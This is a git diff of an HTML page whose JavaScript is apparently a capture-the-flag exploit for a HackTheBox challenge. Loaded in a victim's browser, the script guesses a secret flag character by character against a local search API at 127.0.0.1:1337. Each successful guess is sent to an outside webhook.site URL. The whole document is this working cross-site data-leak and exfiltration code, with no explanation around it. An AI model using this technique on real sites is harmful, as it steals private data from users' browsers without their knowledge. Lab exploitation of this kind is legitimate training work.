@@ -1,31 +1,35 @@
 <!DOCTYPE html>
 <body>
     <script>
-    async function makeFetchRequest() {
-        var whook = 'https://webhook.site/71d7a125-b1bc-4a4f-9437-9797de9ba489/'
-        var url = "http://127.0.0.1:1337/api/entries/search?q=";
-        var htb = 'HTB';
-        var letters = '';
+    var whook = 'https://webhook.site/71d7a125-b1bc-4a4f-9437-9797de9ba489/'
+    var url = "http://127.0.0.1:1337/api/entries/search?q=";
+    var htb = 'HTB';
+    var letters = '';
         
-        // flag characters
-        for(var i=33; i<127; i++){
-            letters += String.fromCharCode(i);
-        }
-        console.log(letters);
+    // flag characters
+    for(var i=33; i<127; i++){
+        letters += String.fromCharCode(i);
+    }
+        
+    async function makeFetchRequest() {
+
         for(var i=0; i<letters.length; i++){
-            
-            var guess = htb + letters[i];
-            await fetch(url+guess)
-            .then(response => {
-                if(response.ok){
-                    fetch(whook+guess)
-                }
-            })
-            //.catch(error => {fetch(whook+guess+'failed')})
+            await doGuess(htb + letters[i]);
         }
     }
+
+        
+    async function doGuess(g){
+        await fetch(url+g)
+        .then(response => {
+            if(response.ok){
+                fetch(whook+g+'SUCCESS')
+                
+            }
+        })
+        .catch(error => {fetch(whook+guess+'failed')})
+    }
     makeFetchRequest();
-    console.log("new");
-    fetch('http://127.0.0.1:1337/api/entries/search?q=H');
+    console.log("newer");
     </script>
 </body>
